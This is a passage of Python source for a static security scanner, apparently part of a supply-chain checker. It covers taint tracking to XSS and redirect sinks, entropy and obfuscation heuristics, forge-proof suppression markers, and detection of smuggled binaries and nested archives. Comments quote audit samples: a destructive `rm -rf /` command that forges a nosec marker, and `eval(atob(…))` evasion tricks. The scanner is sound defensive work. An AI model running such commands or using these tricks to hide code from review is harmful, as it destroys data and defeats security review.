        ctx = _FileCtx(lines, lang, jsx=jsx_reading(path))
    # Each line is matched with its comment text removed: `/**/const d =
    # req.query.x` is an assignment, and `x = 1  // req.query` is not a source.
    # (Match text: NFKC for Python, decoded identifier escapes for JS.)
    cmask = ctx.cmask
    issues = []
    # var -> [line_no, frozenset(clean sink suffixes), taint order, scope id,
    #         ((indent, block id), …) of the blocks it was tainted in]
    tainted = {}
    src = TAINT_SOURCES[lang]
    sinks = TAINT_SINKS[lang]
    partial = _PARTIAL_SAN.get(lang, {})
    if lang == "py" and not _TEMPLATE_IMPORT_RE.search(ctx.content):
        sinks = [row for row in sinks if row[1] is not _TEMPLATE_SINK_RE]
    suffixes = list(dict.fromkeys(row[0] for row in sinks))
    ident_re = _IDENT_RUN_RE[lang]
    views = _view_returns(ctx) if lang == "py" and "@" in ctx.content else ()
    routes = _route_params(ctx) if lang == "py" and "def" in ctx.content else {}
    pending = None          # (scope id, names, def line) of a route handler whose body is not yet seen
    xss_sink = next((row for row in sinks if row[0] == "XSS"), None)
    guard_if = _GUARD_IF_RE[lang]
    inside = _literal_continuations(ctx)
    levels = []             # open blocks: [indent, block id, scope id or None]
    ids = [0, 0, 0]         # next block id, scope id, taint order
    in_scope = collections.defaultdict(list)    # scope id -> names tainted in it
    opener = None           # (indent, scope id) of a function whose body is not yet seen
    open_depth = 0          # brackets a statement leaves open …
    continued = 0           # … over this many continuation lines

    def carriers_in(text_code, suf):
        """Tainted vars present in text_code that still pose danger for sink
        suffix suf (None: any), in the order they were tainted."""
        if not tainted:
            return []
        found = [v for v in set(ident_re.findall(text_code))
                 if v in tainted and suf not in tainted[v][1]]
        found.sort(key=lambda v: tainted[v][2])
        return found

    def statement(i, line):
        """Line i's code, joined with the lines that continue its open brackets."""
        depth = _bracket_depth(line)
        if depth <= 0:
            return line
        parts, total, j = [line], 0, i + 1
        while depth > 0 and j < len(lines) and j <= i + TAINT_JOIN_MAX_LINES \
                and total < TAINT_JOIN_MAX_CHARS:
            if not cmask[j]:
                nxt = ctx.mcode(j)[:TAINT_JOIN_MAX_CHARS - total]
                parts.append(nxt)
                total += len(nxt)
                depth += _bracket_depth(nxt)
            j += 1
        return " ".join(parts)

    keyed = {}              # container -> {literal key: clean set, None: no untrusted data}
    allowed = []            # [indent, name, taint order, clean set before] of the allowlist guards open

    def value_clean(rhs):
        """None when the value `rhs` carries no untrusted data, else the
        sink suffixes it is clean for: a sanitizer for the category, or
        every carrier already clean for it."""
        rhs = _keyed_reads(rhs, keyed)
        base = _taint_code(_neutralize(rhs, lang), lang)   # full sanitizers stripped
        if not (src.search(base) or carriers_in(base, None)):
            return None
        clean = set()
        for suf in suffixes:
            neut = _taint_code(_neutralize(rhs, lang, suf), lang) if suf in partial else base
            if not src.search(neut) and not carriers_in(neut, suf):
                clean.add(suf)
        # a response object (make_response(…), HttpResponse(…)) or a value
        # marked safe: the XSS sink reports what it is built from
        if xss_sink is not None and xss_sink[1].search(rhs):
            clean.add("XSS")
        # a path on this site, or a URL on a fixed host
        if _SAME_SITE_RE.match(rhs):
            clean.add("REDIR")
        return frozenset(clean)

    def report(suffix, cat, sev, cwe, fix, text, i, col):
        """A T-* finding when `text` (a sink's arguments, a view's return
        value) carries untrusted data for sink category `suffix`."""
        rest_code = _taint_code(_neutralize(_keyed_reads(text, keyed), lang, suffix), lang)
        carriers = carriers_in(rest_code, suffix)
        if not carriers and not src.search(rest_code):
            return
        what = (f"untrusted data via '{carriers[0]}' (tainted at line {tainted[carriers[0]][0]})"
                if carriers else "untrusted data")
        issues.append(mk_issue(
            {"id": f"T-{suffix}", "name": f"Tainted flow → {cat}", "type": "VULN", "sev": sev,
             "msg": f"Possible {cat}: {what} reaches this sink.",
             "why": "Data from user input or a decode function flows into a dangerous call "
                    "without visible sanitization (lightweight intra-file taint tracking).",
             "fix": fix, "ref": f"{cwe} · Taint analysis"}, path, i + 1, lines, col))

    for i in range(len(lines)):
        if cmask[i]:
            continue
        line = ctx.mcode(i)
        if not line or line.isspace():
            continue
        if not i & 63:
            ctx.check_time()
        # ---- the structure (see "Where a taint lives") ----
        structural = False
        if i not in inside:
            depth = sum(_BRACKET_DELTA.get(ch, 0) for ch in ctx.names_code(i)) if lang == "py" else 0
            if open_depth > 0 and continued < TAINT_JOIN_MAX_LINES:
                open_depth = max(0, open_depth + depth)
                continued += 1
            else:
                structural = True
                open_depth, continued = max(0, depth), 0
                raw = lines[i]
                indent = len(raw) - len(raw.lstrip())
                while allowed and indent <= allowed[-1][0]:        # an allowlist guard's block ends
                    _, n, order, before = allowed.pop()
                    if n in tainted and tainted[n][2] == order:
                        tainted[n][1] = before
                while levels and levels[-1][0] > indent:
                    gone = levels.pop()[2]
                    if gone is not None:         # a function's body ends
                        for n in in_scope.pop(gone, ()):
                            if n in tainted and tainted[n][3] == gone:
                                del tainted[n]
                if not levels or levels[-1][0] < indent:
                    scope = opener[1] if opener is not None and indent > opener[0] else None
                    levels.append([indent, ids[0], scope])
                    ids[0] += 1
                    if pending is not None and scope == pending[0]:
                        # a route handler's body: the parameters it takes from the request
                        chain = tuple((lv[0], lv[1]) for lv in levels)
                        for name in pending[1]:
                            keyed.pop(name, None)
                            tainted[name] = [pending[2] + 1, frozenset(), ids[2], scope, chain]
                            ids[2] += 1
                            in_scope[scope].append(name)
                        pending = None
                opener = None
                if _scope_opener(line, lang):
                    opener = (indent, ids[1])
                    pending = (ids[1], routes[i], i) if i in routes else None
                    ids[1] += 1
        stmt = None
        names, rhs = _assignment(line, lang)
        container, written = (None, None) if names else _container_write(line, lang)
        if names:
            stmt = statement(i, line)
            joined = _assignment(stmt, lang)
            if joined[0]:
                names, rhs = joined
            clean = value_clean(rhs)
            chain = tuple((lv[0], lv[1]) for lv in levels)
            scope = next((lv[2] for lv in reversed(levels) if lv[2] is not None), None)
            augmented = bool(_AUG_ASSIGN_RE[lang].match(stmt))
            for name in names:
                if not augmented:
                    keyed.pop(name, None)
                old = tainted.get(name)
                replaces = (old is not None and structural and not augmented
                            and (levels[-1][0], levels[-1][1]) in old[4])
                if old is None or replaces:
                    if clean is None:
                        tainted.pop(name, None)
                    else:
                        tainted[name] = [i + 1, clean, ids[2], scope, chain]
                        ids[2] += 1
                        if scope is not None:
                            in_scope[scope].append(name)
                elif clean is not None:
                    old[1] = old[1] & clean
        elif container is not None:
            stmt = statement(i, line)
            joined = _container_write(stmt, lang)
            if joined[0] == container:
                written = joined[1]
            clean = value_clean(written)
            km = _KEYED_WRITE_RE.match(stmt)
            if km and km.group(1) == container:
                keyed.setdefault(container, {})[km.group(3)] = clean
            if clean is not None:
                old = tainted.get(container)
                if old is not None:
                    old[1] = old[1] & clean
                else:
                    scope = next((lv[2] for lv in reversed(levels) if lv[2] is not None), None)
                    tainted[container] = [i + 1, clean, ids[2], scope, tuple((lv[0], lv[1]) for lv in levels)]
                    ids[2] += 1
                    if scope is not None:
                        in_scope[scope].append(container)
        elif tainted and guard_if.match(line):
            stmt = statement(i, line)
            guarded = [n for n in _guarded_names(stmt, lang) if n in tainted]
            if guarded and _guard_exits(ctx, i, stmt, lang):
                for n in guarded:
                    tainted[n][1] = tainted[n][1] | {"PATH"}
            guard = _allow_guard(stmt, lang)
            if guard is not None and guard[0] in tainted:
                code = _taint_code(guard[1], lang)
                if not src.search(code) and not carriers_in(code, None):
                    entry = tainted[guard[0]]
                    if guard[2]:                 # leaves when not a member: clean from here on
                        if _guard_exits(ctx, i, stmt, lang):
                            entry[1] = frozenset(suffixes)
                    else:                        # a member inside the block
                        raw = lines[i]
                        allowed.append([len(raw) - len(raw.lstrip()), guard[0], entry[2], entry[1]])
                        entry[1] = frozenset(suffixes)
        xss_here = False
        for suffix, sink_re, cat, sev, cwe, fix in sinks:
            sm = sink_re.search(line)
            if not sm:
                continue
            if stmt is None:
                stmt = statement(i, line)
            xss_here = xss_here or suffix == "XSS"
            if suffix == "XSS" and (_NON_HTML_TYPE_RE.search(_extent(stmt[sm.end():])) if lang == "py"
                                    else _NON_HTML_CHAIN_RE.search(sm.group(0))):
                continue                      # a text/plain or JSON response
            # neutralize full + this-category sanitizers in the sink's arguments
            args = _sink_args(stmt[sm.end():], sink_re, lang, suffix)
            report(suffix, cat, sev, cwe, fix, args, i, sm.start())
        if i in views and not xss_here and xss_sink is not None:
            if stmt is None:
                stmt = statement(i, line)
            rm = _RETURN_RE.match(stmt)
            value = _first_arg(stmt[rm.end():])
            if value.strip() and not _VIEW_RETURN_SKIP_RE.match(value) and _view_body(value):
                report(xss_sink[0], *xss_sink[2:], value, i, rm.end() - 6)
    return issues

# ---------------- Obfuscation / entropy heuristics ----------------
import math

def shannon_entropy(s):
    if not s:
        return 0.0
    freq = {}
    for ch in s:
        freq[ch] = freq.get(ch, 0) + 1
    return -sum((n / len(s)) * math.log2(n / len(s)) for n in freq.values())

ENTROPY_VALUE_RE = re.compile(r"[=:]\s*[\"']([A-Za-z0-9+/=_\-]{20,})[\"']")
B64_BLOB_RE = re.compile(r"[\"'][A-Za-z0-9+/]{200,}={0,2}[\"']")
CHARCODE_RE = re.compile(r"String\.fromCharCode")
OBF_IDENT_RE = re.compile(r"\b_0x[0-9a-f]{4,}\b")
# Verdict-integrity fix (audit C2/G2): the bare word `test` matched anywhere on
# the line — including in a comment — and silently disabled every entropy/secret
# check on it. REMOVED: `test` must not gate entropy detection at all. The
# remaining tokens are word-bounded so substrings (`latest`, `attested`,
# `detest`) no longer suppress.
SECRET_SKIP_RE = re.compile(r"environ|process\.env|getenv|\bplaceholder\b|\bexample\b|"
                            r"\bdummy\b|\bsample\b|\bmock\b|\bredacted\b|\bxxxx+\b", re.I)

def entropy_secretish(v):
    """True only if a high-entropy literal actually looks like a credential, not a
    URL/path, a dotted name, or a CamelCase/snake_case identifier. This filters the
    common S-ENTROPY false positives (route strings, TypeVar bounds, class names)."""
    if v.count("/") >= 2 or v.startswith("/") or " " in v or "\\" in v:
        return False                                  # path, URL, or sentence
    core = v.replace("_", "").replace("-", "").replace(".", "")
    if core.isalpha():
        return False                                  # identifier / CamelCase / word
    # real tokens carry digits or base64 symbols, not just letters+separators
    if not (any(c.isdigit() for c in v) or any(c in "+=" for c in v)):
        return False
    return shannon_entropy(v) > 4.0

# ---------------- Inline suppression ----------------
# Marker grammar (review fix, shared semantics 2): `#`, `//` or `--`, optional
# spaces/tabs, then nosec / NOSONAR / lazaret-ignore (case-insensitive, whole
# word). If what follows (after optional spaces and ':') is a comma-separated
# list of rule IDs, the marker suppresses only those rules; anything else —
# nothing, trailing whitespace, or a free-text reason such as "- reviewed by
# bob" — makes it a blanket marker for the line. The marker counts only when
# its introducer ('#', '//', '--') lies inside a real comment as the per-file
# comment lexer sees it (so `--` works in .sql comments, `#` in Python ones,
# and nothing inside a string, a template literal or code such as `x --nosec`
# or a JS `#private` field does). It applies to its own line, or to the next
# line when it sits on a standalone comment line. The marker is ASCII: re.I
# would also take `noſec` or `lazaret-ıgnore` (ſ is s and ı is i to it),
# which the npm engine's case folding does not; for a marker, matching less
# is what fails closed.
_RULE_ID_SRC = r"(?:S|T|SC|X|SQL|B|Q)-[A-Z0-9]+(?:-[A-Z0-9]+)*"
SUPPRESS_RE = re.compile(
    r"(?:#|//|--)[ \t]*(?:nosec|NOSONAR|lazaret-ignore)\b"
    r"(?:[ \t]*:?[ \t]*(" + _RULE_ID_SRC + r"(?:[ \t]*,[ \t]*" + _RULE_ID_SRC + r")*))?",
    re.I)

# Verdict integrity (audit C2/H6): findings from these rule families are never
# suppressible by markers in the scanned code. Supply-chain indicators (SC-*)
# and interprocedural taint findings (X-*) describe the artifact's own attempt
# to hide; a dependency has no trusted reviewer to vouch for a `nosec` marker,
# so dep mode never honors suppression either (card G1/G2).
UNSUPPRESSIBLE_PREFIXES = ("SC-", "X-")


def string_literal_mask(line, lang=None):
    """Per-character boolean mask: True where a character is inside a string
    literal on this line (verdict-integrity fix, audit C2).

    Line-local, best-effort quote tracking: ' and " with backslash escapes for
    every language; ` only for JavaScript (template literals). When lang is
    unknown, backticks are treated as quotes — over-masking a marker is the
    fail-closed direction (a missed suppression surfaces a finding; a false
    suppression hides one).
    """
    mask = [False] * len(line)
    backtick_ok = (lang or "js") == "js"
    quote = None
    j = 0
    while j < len(line):
        ch = line[j]
        if quote is None:
            if ch in "\"'":
                quote = ch
            elif ch == "`" and backtick_ok:
                quote = "`"
        elif ch == "\\":
            mask[j] = True
            if j + 1 < len(line):
                mask[j + 1] = True
            j += 2
            continue
        elif ch == quote:
            quote = None
        else:
            mask[j] = True
        j += 1
    return mask


def _find_marker(line, spans):
    """The first ASCII SUPPRESS_RE match on `line` whose introducer lies
    inside one of the line's comment spans, else None. `spans` is sorted and
    non-overlapping, and matches come in order, so one moving index answers
    every containment test (review: testing every span for every match was
    O(matches × spans), 20 s for one 200 KB line)."""
    if not spans:
        return None
    k, n = 0, len(spans)
    for m in SUPPRESS_RE.finditer(line):
        p = m.start()
        while k < n and spans[k][1] <= p:
            k += 1
        if k == n:
            return None
        if spans[k][0] <= p and m.group().isascii():
            return m
    return None


def _marker_rules(m):
    """None for a blanket marker, else the frozenset of rule IDs it names."""
    ids = m.group(1)
    if not ids:
        return None
    return frozenset(s.strip().upper() for s in ids.split(","))


def marker_in_comment(line, lang=None):
    """The suppression marker on this line if it lives in real comment text
    (the line lexed on its own), else None. A `-- nosec` inside a string
    (the audit PoC `os.system("rm -rf / -- nosec")`) returns None."""
    return _find_marker(line, _comment_layout(line, [line], lang)[1].get(0))


_NO_MARKER = object()


def _suppressed_in(issue, ctx):
    rule = str(issue.get("rule", "")).upper()
    ln = issue["line"] - 1
    for k in (ln, ln - 1):
        if not (0 <= k < len(ctx.lines)):
            continue
        if k != ln and not ctx.cmask[k]:
            continue  # the line above counts only if it is a standalone comment
        ids = ctx.marker(k)
        if ids is _NO_MARKER:
            continue
        if ids is None or rule in ids:
            return True
    return False


def is_suppressed(issue, lines, lang=None, dep=False):
    # Suppression markers are reviewer annotations. The scanned code itself
    # must not be able to forge them (audit C2/G1: a marker inside a string
    # literal made a CRITICAL finding vanish and the gate PASSED; review: a
    # `# nosec"""` closing a docstring, a `// NOSONAR` inside a template
    # literal and `os.system(x) --nosec` in Python did the same), and
    # dependency/registry mode has no reviewer at all (G2: `// nosec` cleared
    # SC-EVAL-DECODE on a live implant). Never suppress supply-chain or
    # interprocedural findings, and never in dep mode. Suppression never
    # crosses files: the marker must be in `lines`, the finding's own file.
    if dep or str(issue.get("rule", "")).startswith(UNSUPPRESSIBLE_PREFIXES):
        return False
    ctx = _active_ctx(lines)
    if ctx is None or ctx.lang != lang:
        ctx = _FileCtx(lines, lang)
    return _suppressed_in(issue, ctx)

# ---------------- Binary / compiled-artifact detection ----------------
# Source packages (sdists, npm tarballs, repos) should ship reviewable source,
# not prebuilt binaries. Smuggled binaries are a primary supply-chain vector:
# malicious code inside a compiled blob never appears in the source you review.
# Wheels legitimately ship compiled extensions, so presence there is inventory,
# not alarm. Detection is by content (magic bytes), not just file extension.

EXEC_MAGIC = [
    (b"\x7fELF", "ELF binary (Linux/Unix executable or shared object)"),
    (b"\xfe\xed\xfa\xce", "Mach-O binary (macOS)"),
    (b"\xfe\xed\xfa\xcf", "Mach-O 64-bit binary (macOS)"),
    (b"\xce\xfa\xed\xfe", "Mach-O binary (macOS)"),
    (b"\xcf\xfa\xed\xfe", "Mach-O 64-bit binary (macOS)"),
    (b"\xca\xfe\xba\xbe", "Mach-O universal binary or Java .class"),
    (b"\x00asm", "WebAssembly module"),
    (b"dex\n", "Android DEX bytecode"),
]
COMPILED_EXTS = {".so", ".pyd", ".dll", ".dylib", ".node", ".a", ".lib", ".o",
                 ".obj", ".exe", ".pyc", ".pyo", ".class", ".wasm",
                 ".dex", ".jar", ".msi", ".dmg",
                 ".jsc"}              # V8 bytecode (bytenode): JavaScript no one can read
# Recognized benign binary assets — data, not code. Not flagged.
BENIGN_MAGIC = [b"\x89PNG", b"\xff\xd8\xff", b"GIF8", b"RIFF", b"OggS", b"BM",
                b"\x00\x00\x01\x00", b"wOFF", b"wOF2", b"ID3", b"%PDF",
                b"II*\x00", b"MM\x00*", b"\x1a\x45\xdf\xa3", b"ftyp",
                # JPEG 2000 (codestream, JP2), Photoshop, Apple icons, DirectDraw,
                # OpenType / TrueType collections, PostScript, GIMP, SGI, Sun raster,
                # FITS, QOI, Radiance HDR, FLAC, cursors
                b"\xff\x4f\xff\x51", b"\x00\x00\x00\x0cjP  ", b"8BPS", b"icns", b"DDS ",
                b"OTTO", b"ttcf", b"%!PS", b"\xc5\xd0\xd3\xc6", b"gimp xcf", b"\x01\xda",
                b"\x59\xa6\x6a\x95", b"SIMPLE  =", b"qoif", b"#?RADIANCE", b"fLaC",
                b"\x00\x00\x02\x00"]
# Formats identified by a signature that isn't at offset 0, or by extension
# because their magic is too generic to trust alone.
# Document and asset formats that are zip or gzip containers by design.
CONTAINER_DOCUMENT_EXTS = {".docx", ".xlsx", ".pptx", ".odt", ".ods", ".odp", ".odg", ".epub",
                           ".dia", ".svgz", ".ora", ".kmz", ".3mf", ".xmind", ".vsdx"}
FONT_EXTS = {".ttf", ".otf", ".ttc", ".woff", ".woff2", ".eot", ".pfb", ".pcf", ".bdf"}
#: MPEG transport stream video (a camera's AVCHD .mts): the extensions it shares
#: with TypeScript (.ts, .mts), and Blu-ray's .m2ts
MPEG_TS_EXTS = (".ts", ".mts", ".m2ts")


def is_benign_media(header, ext):
    if any(header.startswith(sig) for sig in BENIGN_MAGIC) or b"ftyp" in header[:16]:
        return True
    if header[36:40] == b"acsp":                       # ICC color profile
        return True
    if ext in MPEG_TS_EXTS and _mpeg_ts(header):        # video
        return True
    return ext in FONT_EXTS and header[:4] in (b"\x00\x01\x00\x00", b"true", b"typ1")
NESTED_ARCHIVE_MAGIC = [(b"PK\x03\x04", "zip"), (b"\x1f\x8b", "gzip"),
                        (b"BZh", "bzip2"), (b"\xfd7zXZ\x00", "xz"),
                        (b"7z\xbc\xaf\x27\x1c", "7-zip"), (b"Rar!", "rar")]

def byte_entropy(data):
    if not data:
        return 0.0
    freq = [0] * 256
    for b in data:
        freq[b] += 1
    n = len(data)
    return -sum((c / n) * math.log2(c / n) for c in freq if c)

# Characters that cannot occur in text: bytes of invalid UTF-8 sequences
# (decoded with surrogateescape to U+DC80..U+DCFF) and C0 controls other than
# whitespace and ESC, NUL included. 0x0E..0x1A are listed one by one: the
# class is the same, and reads as meant rather than as a wide range.
_NON_TEXT_CHARS_RE = re.compile("[\udc80-\udcff\x00-\x08\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a"
                                "\x1c-\x1f\x7f]")
_NON_TEXT_SHARE = 0.30


def looks_binary(sample):
    """Heuristic text/binary classification from a leading byte sample.

    Only bytes that cannot be text count: invalid UTF-8 and C0 control
    characters (NUL included). Valid non-ASCII UTF-8 is text however much of
    it there is (an accented package description, CJK comments), and a single
    NUL inside a comment does not turn a source file into a "binary" that is
    never scanned. Callers must not use this to decide whether a file with a
    source extension or a manifest name gets scanned: those are always
    scanned as text (see decode_source)."""
    if not sample:
        return False
    sample = bytes(sample)
    text = sample.decode("utf-8", "surrogateescape")
    bad = len(_NON_TEXT_CHARS_RE.findall(text))
    return bad / len(sample) > _NON_TEXT_SHARE


def _mpeg_ts(header):
    """MPEG transport stream (.ts / .mts video): sync byte every 188 bytes.
    Shares the .ts and .mts extensions with TypeScript."""
    return len(header) >= 377 and header[0] == header[188] == header[376] == 0x47


# ---------------- Source decoding for archive members (registry, MCP) ----------------
def _text_is_plausible(text):
    """Does a UTF-16 guess (NUL in the first four bytes, no BOM) read as
    text? A UTF-8 file with a NUL near the top (`/*\\0*/eval(…)`) decodes to
    CJK-looking garbage under UTF-16; real UTF-16 source is mostly ASCII."""
    if not text:
        return False
    sample = text[:2048]
    plain = sum(1 for ch in sample if " " <= ch <= "~" or ch in "\t\r\n")
    return plain / len(sample) >= 0.70


def _undecodable_share(text):
    if not text:
        return 0.0
    sample = text[:65536]
    bad = sample.count("�") + len(_NON_TEXT_CHARS_RE.findall(sample))
    return bad / len(sample)


def decode_member(path, data, lang=None):
    """Decode one archive member (registry) or one file named by an MCP
    caller the way its runtime reads it. -> (text, extra_issues).

    Same decoding as a project scan (decode_source: BOM, BOM-less UTF-16
    only when it reads as text, PEP 263 cookies for Python incl. UTF-7 ->
    SC-UTF7) and the same Q-ENCODING / SC-UTF7 findings (encoding_issues).
    One addition for verdict integrity: a member that does not decode to
    anything text-like (more than 30% invalid bytes or control characters)
    adds SC-TRUNCATED — it was "scanned" only as mojibake, so the scan of it
    proves nothing. Never raises on content. `lang`: the language the
    member runs as when its name does not say (a Python script by its #!
    line keeps its coding cookie); by default, its extension's."""
    data = bytes(data or b"")
    ext = os.path.splitext(path)[1].lower()
    if lang is None:
        lang = "py" if ext in (".py", ".pyw") else EXTS.get(ext)
    text, info = decode_source(data, lang)
    extra = encoding_issues(path, text, info)
    share = _undecodable_share(text)
    if share > _NON_TEXT_SHARE and not (ext in MPEG_TS_EXTS and _mpeg_ts(data[:512])):
        extra.append(truncated_issue(
            path, f"content is not decodable as text ({share:.0%} invalid bytes or "
                  f"control characters), so no rule could read it"))
    return text, extra

def classify_binary(path, data, size, context):
    """Return a supply-chain issue dict for a suspicious non-source file, or None.

    context: 'sdist' | 'npm' | 'wheel' | 'repo'
    data:    leading bytes of the file (>= a few KB is ideal for entropy)
    size:    full file size in bytes
    """
    header = data[:512]
    ext = os.path.splitext(path)[1].lower()

    def issue(rid, name, sev, msg, why, fix):
        return {"rule": rid, "name": name, "type": "HOTSPOT", "sev": sev, "msg": msg,
                "why": why, "fix": fix, "ref": "CWE-506 · Supply chain",
                "file": path, "line": 1, "snippet": [], "snipStart": 1}

    is_bin = looks_binary(data[:2048])
    # 1) executable / compiled artifact (by magic, or extension as fallback)
    desc = next((d for sig, d in EXEC_MAGIC if header.startswith(sig)), None)
    if desc is None and is_bin and header.startswith(b"MZ"):
        desc = "Windows PE executable/DLL"
    if desc is None and ext in COMPILED_EXTS:
        desc = f"compiled artifact ({ext})"
    if desc:
        if context == "wheel":
            return issue("SC-BINARY", "Binary artifact in package", "INFO",
                f"Bundled binary: {desc}.",
                "Wheels legitimately ship compiled extensions. Listed for inventory; "
                "verify it matches the project's published, reproducible build.",
                "Cross-check against the upstream build; prefer building from source in sensitive contexts.")
        where = {"sdist": "a source distribution", "npm": "an npm package",
                 "repo": "the source tree"}.get(context, "the package")
        return issue("SC-BINARY", "Binary artifact in package", "MAJOR",
            f"Executable/compiled binary in {where}: {desc}.",
            "Prebuilt binaries can't be reviewed as source, and smuggled binaries are a "
            "known compromise vector. Many legitimate packages ship some (Windows "
            "launcher stubs, test fixtures), so on its own this is a capability to "
            "review, not evidence of malice.",
            "Confirm the binary's provenance; build from source instead of trusting a prebuilt blob.")
    # 2) nested archive — a known way to hide a second-stage payload from review
    #    (document formats that are zip/gzip containers by design are data)
    if ext in CONTAINER_DOCUMENT_EXTS:
        return None
    if header[257:262] == b"ustar":
        return issue("SC-NESTED-ARCHIVE", "Nested archive in package", "MINOR",
            "Embedded tar archive inside the package.",
            "Nested archives can conceal second-stage payloads from source review.",
            "Extract and inspect the archive's contents.")
    for sig, kind in NESTED_ARCHIVE_MAGIC:
        if header.startswith(sig):
            if context == "wheel" and kind == "zip":
                break
            return issue("SC-NESTED-ARCHIVE", "Nested archive in package", "MINOR",
                f"Embedded {kind} archive inside the package.",
                "Nested archives can conceal second-stage payloads from source review "
                "(a known supply-chain evasion technique).",
                "Extract and inspect the archive's contents.")
    # 3) recognized benign asset (image/font/media/pdf) -> ignore
    if is_benign_media(header, ext):
        return None
    # 4) opaque high-entropy blob -> possible packed/encrypted payload
    if is_bin and size >= 1024:
        ent = byte_entropy(data[:8192])
        if ent > 7.2:
            return issue("SC-OPAQUE-BLOB", "High-entropy binary blob", "MAJOR",
                f"Opaque high-entropy file ({size} bytes, entropy {ent:.1f}/8).",
                "Encrypted or packed data shipped in a package can be a second-stage "
                "payload that is decoded and executed at runtime.",
                "Identify what this file is and why it ships; reject unexplained binary blobs.")
    return None

# ---------------- Truncation accounting (verdict integrity, audit C2/G16) ----------------
# Every place scanning is cut short must emit a signal, never a silent skip:
# a file that was not scanned cannot be a data point for a clean verdict.
# SC-* findings fail the "No supply-chain indicators" gate condition, so a
# truncated scan can never report PASSED.

def truncated_issue(path, detail, sev="CRITICAL", rule="SC-TRUNCATED", name="Scan truncated"):
    """Issue dict for a file/limit that stopped the scan early. `detail` names
    the concrete limit and numbers (e.g. '11644385 bytes declared')."""
    return {"rule": rule, "name": name, "type": "HOTSPOT", "sev": sev,
            "msg": f"File not fully scanned: {detail}.",
            "why": ("Scanning stopped early, so a clean verdict for this file is not "
                    "evidence of anything — the unscanned bytes are exactly where a "
                    "hostile artifact would put its payload (audit C2/G16: declared "
                    "sizes and entry counts are attacker-controlled and were used to "
                    "skip files with zero signal)."),
            "fix": "Review the file manually or raise the limit and re-scan.",
            "ref": "CWE-506 · Supply chain", "file": path, "line": 1,
            "snippet": [], "snipStart": 1}

LONG_LINE = 160
FN_LEN_LIMIT = 60
FN_CX_LIMIT = 12
FN_HEADER_SCAN_LIMIT = 2000   # chars of a JS line searched for a function header
EXTS = {".py": "py", ".pyw": "py", ".js": "js", ".jsx": "js", ".ts": "js", ".tsx": "js",
        ".mts": "js", ".cts": "js", ".mjs": "js", ".cjs": "js", ".sql": "sql"}
# G10 + review item 8: what the project walk never source-scans.
#   * .git (exactly that name) is always pruned — VCS metadata, never
#     shippable source (and reported as a Q-SKIPPED-TREE blind spot).
#   * __pycache__ is not source-scanned, but every .pyc directly in it is
#     checked (see _check_pycache): an unchecked-hash pyc runs on import
#     whatever the .py next to it says (SC-PYC-UNCHECKED), and a pyc without
#     its source is unreviewable (SC-PYC-ORPHAN).
#   * dependency trees are pruned unless --deps (then walked, their files
#     marked dep=True): node_modules / bower_components / site-packages
#     always, vendor / venv / .venv / env only when they LOOK like a
#     dependency tree (DEP_TREE_MARKERS) — a first-party app/vendor/ helper
#     module used to be pruned by name alone, hiding it from every rule.
#   * --exclude NAME prunes any directory of that name (explicit, always).
# Every other classic "build output" directory — dist, build, migrations,
# coverage — is scanned: npm packages are *published from* dist/, migrations
# ARE the production SQL. Pruned trees are counted and reported, never
# silently dropped.
SKIP_DIRS = {".git", "__pycache__"}     # never source-scanned (see above)
ALWAYS_PRUNE_DIRS = frozenset({".git"})
PYCACHE_DIR = "__pycache__"
DEP_TREE_DIRS = frozenset({"node_modules", "bower_components", "site-packages"})
# name -> (marker names directly inside, marker suffixes directly inside)
DEP_TREE_MARKERS = {
    "venv": (("pyvenv.cfg",), ()),
    ".venv": (("pyvenv.cfg",), ()),
    "env": (("pyvenv.cfg",), ()),
    "vendor": (("modules.txt", "autoload.php", "package.json"), (".dist-info", ".egg-info")),
}
# Legacy convenience names kept for reference; they are NOT skipped unless
# listed with --exclude.
OPTIN_SKIP_DIRS = ["node_modules", "venv", ".venv", "env", "dist", "build",
                   ".next", "coverage", "vendor", "site-packages", ".tox",
                   ".mypy_cache", ".pytest_cache", "migrations"]

# G10: skipped-directory accounting. collect_files() fills this for callers of
# the legacy (files, manifests, binary_issues) API that then call
# skipped_tree_issues(); it is RESET at the start of every collect_files()
# call, so repeated scans in one process (the MCP server) never leak one
# scan's pruned trees into the next. scan_project() does not use it at all.
_SKIPPED_TREES = []   # [(relpath, file_count, byte_count)]

def _reset_scan_state():
    global _SKIPPED_TREES
    _SKIPPED_TREES = []

def _tree_stats(tree_path):
    """(file_count, byte_count) of a pruned tree, walked iteratively without
    following symlinks (a pruned tree can be arbitrarily deep or hostile)."""
    n_files, n_bytes = 0, 0
    stack = [tree_path]
    while stack:
        cur = stack.pop()
        try:
            with os.scandir(cur) as it:
                entries = list(it)
        except OSError:
            continue
        for e in entries:
            try:
                st = e.stat(follow_symlinks=False)
            except OSError:
                continue
            if _stat.S_ISDIR(st.st_mode) and not _is_reparse_point(st):
                stack.append(e.path)
            else:
                n_files += 1
                if _stat.S_ISREG(st.st_mode):
                    n_bytes += st.st_size
    return n_files, n_bytes

def _count_skipped_tree(root, tree_path, rel=None, into=None):
    """Record a pruned directory with its file count and total size for the
    INFO blind-spot accounting surfaced after the scan. `rel` is the
    root-relative display path (review item 5: it used to be cwd-relative,
    e.g. './app/vendor', when the root was given as a relative path)."""
    n_files, n_bytes = _tree_stats(tree_path)
    if rel is None:
        rel = _fs_display(os.path.relpath(tree_path, root))
    (_SKIPPED_TREES if into is None else into).append((rel, n_files, n_bytes))

def _skipped_issue(rel, n_files, n_bytes):
    return {
        "rule": "Q-SKIPPED-TREE", "name": "Skipped directory (not scanned)",
        "type": "SMELL", "sev": "INFO",
        "msg": f"Directory {rel} was skipped ({n_files} files, {n_bytes} bytes unread).",
        "why": "Skipped trees are invisible to every rule — the classic hiding places "
               "(dist, build, .git) hold published code and committed-then-deleted "
               "secrets. Generated trees you own are fine to skip on purpose; "
               "unexpected entries here are blind spots.",
        "fix": "Only exclude generated trees you control; remove the exclusion "
               "otherwise so the tree is scanned.",
        "ref": "Maintainability",
        "file": rel, "line": 1, "snippet": [], "snipStart": 1}

def skipped_tree_issues(skipped=None):
    """INFO issues summarizing the pruned trees (.git, dependency trees,
    --exclude) so the coverage gap is visible instead of silent. `skipped`
    defaults to the trees recorded by the most recent collect_files()."""
    return [_skipped_issue(*t) for t in (_SKIPPED_TREES if skipped is None else skipped)]

# ---------------- Comment lexer (review fix: shared semantics 1) ----------------
# is_comment() used to be a line-local prefix test: any JS/SQL line starting
# with "/*" or "*" counted as a comment, so `/**/eval(atob(…))`, a minified
